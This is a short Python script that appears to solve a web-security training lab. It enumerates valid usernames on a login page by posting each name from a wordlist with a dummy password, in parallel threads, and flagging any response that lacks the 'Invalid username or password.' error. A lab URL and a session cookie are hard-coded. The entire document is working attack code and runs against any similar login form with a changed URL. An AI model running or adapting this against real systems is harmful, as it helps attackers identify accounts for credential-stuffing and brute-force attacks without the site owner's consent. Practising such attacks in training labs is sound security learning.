import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username or password.' not in loginRequestText:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0aaf00c003265f148136f20b00b100ef.web-security-academy.net/login'
    cookie = {'session': 'Y1bPPRn8EkXY3tJjIta9pkMTS0UlE64L'}

    userFileName = './username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()